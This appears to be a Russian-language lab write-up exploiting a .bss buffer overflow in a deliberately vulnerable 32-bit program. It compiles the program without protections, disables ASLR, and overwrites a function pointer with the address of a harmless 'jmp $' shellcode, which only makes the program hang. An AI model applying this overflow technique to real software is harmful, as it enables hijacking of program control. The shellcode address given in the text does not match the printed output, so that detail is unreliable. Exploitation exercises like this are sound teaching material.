
Компилируем уязвимую программу (32-bit, без защиты стека, с исполняемым BSS):

```bash
gcc -g -m32 -fno-stack-protector -z execstack vuln_bss.c -o vuln_bss
```

Запускаем, чтобы увидеть адреса buf, &f и переменной окружения SHELLCODE:

```bash
setarch $(uname -m) -R bash -c '
SC=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\xeb\xfe\")")
SHELLCODE="$SC" ./vuln_bss a
'
```

```
addr buf: 0x56559040
addr &f:  0x565590a4
�� 0xffffc5e8
f: 0x565561cd
v: a
```

`0x565590a4 - 0x56559040 = 0x64 = 100` байт -- расстояние от `buf` до указателя `f` в .bss

`0xffffc4e9` -- адрес шеллкода в переменной окружения SHELLCODE

Фактически нужно просто подложить код, который будет `jmp` на начало своего исполнения:

```
eb fe   ->   jmp -2   (jmp $)
```

Пейлоад: 100 байт заполнения + адрес SHELLCODE в формате little-endian.

Что получилось:

```bash
setarch $(uname -m) -R bash -c '
SC=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\xeb\xfe\")")
SHELLCODE="$SC" ./vuln_bss "$(python3 payload.py)"
'
```

Программа зависает и не возвращается в `main`.
